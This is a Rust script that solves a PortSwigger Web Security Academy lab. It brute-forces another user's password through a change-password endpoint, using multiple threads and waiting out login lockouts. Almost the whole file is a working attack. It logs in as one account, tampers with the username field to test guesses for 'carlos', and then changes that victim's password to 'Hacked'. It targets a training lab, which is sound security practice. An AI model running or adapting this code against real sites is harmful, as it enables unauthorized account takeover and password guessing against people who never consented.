/******************************************************************
*
* Author: Ahmed Elqalawy (@elqal3awii)
*
* Date: 29/8/2023
*
* Lab: Password brute-force via password change
*
* Steps: 1. Login with correct creds
*        2. Change username when requesting change password API
*        3. Repeat the process trying every password
*
*******************************************************************/
#![allow(unused)]
use lazy_static::lazy_static;
/***********
* Imports
***********/
use rayon::prelude::*;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
    Error,
};
use std::{
    collections::HashMap,
    error,
    fmt::format,
    fs,
    io::{self, Write},
    process,
    sync::{
        atomic::{AtomicUsize, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{self, Duration, Instant},
};
use text_colorizer::Colorize;

/******************
* Global variables
*******************/
lazy_static! {
    static ref VALID_PASSWORD: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));
    static ref PASSWORDS_COUNTER: AtomicUsize = AtomicUsize::new(0);
}

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aba002e036f2c5982898835006f006d.web-security-academy.net";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    // read password list as one string
    // change the path to your password list
    let passwords_string = fs::read_to_string("/home/ahmed/passwords").unwrap();

    // split the big string to a list of passwords
    // change the separator to \r\n if you still a windows user
    let passwords: Vec<&str> = passwords_string.split('\n').collect();

    // set number of threads
    let threads = 8;

    // how many passwords will be tried in each thread
    let chunk_per_thread = passwords.len() / threads;

    // split the whole list to sublist to run each one in a thread
    let passwords_chunks: Vec<_> = passwords.chunks(chunk_per_thread).collect();

    // capture the time before brute forcing
    let start_time = time::Instant::now();

    println!(
        "{} {}..",
        "[#] Brute forcing password of".white().bold(),
        "carlos".green().bold()
    );

    // set the new password
    // change this to what you want
    let new_password = "Hacked";

    // get the password length
    let passwords_count = passwords.len();

    // run every sublist in different thread
    passwords_chunks.par_iter().for_each(|minilist| {
        // iterate over every password in the sublist
        for password in minilist.iter() {
            // iterate only if no valid password is found
            if VALID_PASSWORD.lock().unwrap().len() == 0 {
                // try to make a successful login first
                if let Ok(login_res) = login(&client, &format!("{url}/login"), "wiener", "peter") {
                    // check the status code of the response
                    match login_res.status().as_u16() {
                        // if a redirect happened which means login is successful
                        302 => {
                            // extract session cookie
                            let session = extract_session_cookie(login_res);

                            // try to guess the current password based on change password functionality
                            let change_password = change_password(
                                &client,
                                &format!("{url}/my-account/change-password"),
                                &session,
                                "carlos",
                                password,
                                new_password,
                            );

                            // if the request is successful
                            if let Ok(change_password_res) = change_password {
                                // if the password is changed successfully
                                if change_password_res.status().as_u16() == 200 {
                                    // update the global valid_password variable
                                    VALID_PASSWORD.lock().unwrap().push_str(password);

                                    println!(
                                        "\n[#] {} => {}",
                                        password.blue().bold(),
                                        "Correct".green().bold()
                                    );
                                    println!(
                                        "[#] {}: {}",
                                        "Password changed to".white().bold(),
                                        new_password.green().bold()
                                    );

                                    break;
                                } else {
                                    // password are not correct
                                    print!(
                                        "\r[*] ({}/{}) {:10} => {}",
                                        PASSWORDS_COUNTER.fetch_add(1, Ordering::Relaxed),
                                        passwords_count,
                                        password.blue().bold(),
                                        "Incorrect".red().bold()
                                    );
                                    io::stdout().flush();
                                }
                            } else {
                                // change password request failed
                                println!(
                                    "\n{}",
                                    "[!] Failed to send change-password request".red().bold()
                                )
                            }
                        }
                        _ => {
                            // login failed due to multiple requests; wait 1 minute and continue
                            println!("[!] {}", "Waiting 1 minute".yellow().bold());
                            thread::sleep(Duration::from_secs(60))
                        }
                    }
                } else {
                    // login faild for unknown reason
                    println!(
                        "[*] {} => {}",
                        password.white().bold(),
                        "LOGIN FAILED".red()
                    );
                }
            } else {
                // if valid password is valid, exit from all threads
                return;
            }
        }
    });
    print_finish_message(start_time);
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(time::Duration::from_secs(60))
        .build()
        .unwrap()
}

/********************************************
* Function used to login with correct creds
*********************************************/
fn login(client: &Client, url: &str, username: &str, password: &str) -> Result<Response, Error> {
    client
        .post(format!("{url}"))
        .form(&HashMap::from([
            ("username", username),
            ("password", password),
        ]))
        .send()
}

/*****************************************************
* Function used to extract session from cookie header
******************************************************/
fn extract_session_cookie(res: Response) -> String {
    let re = regex::Regex::new("session=(.*); Secure").unwrap();
    let cookie_header = res.headers().get("set-cookie").unwrap().to_str().unwrap();
    re.captures(cookie_header)
        .unwrap()
        .get(1)
        .unwrap()
        .as_str()
        .to_string()
}

/**********************************************
* Function used to request change-password API
***********************************************/
fn change_password(
    client: &Client,
    url: &str,
    session: &str,
    username: &str,
    current_password: &str,
    new_password: &str,
) -> Result<Response, Error> {
    client
        .post(url)
        .header("Cookie", format!("session={session}"))
        .form(&HashMap::from([
            ("username", username),
            ("current-password", current_password),
            ("new-password-1", new_password),
            ("new-password-2", new_password),
        ]))
        .send()
}

/****************************************************
* Function used to to print finish time
*****************************************************/
#[inline(always)]
fn print_finish_message(start_time: Instant) {
    println!(
        "\n{}: {:?} minutes",
        "✅ Finished in".green().bold(),
        start_time.elapsed().as_secs() / 60
    );
}
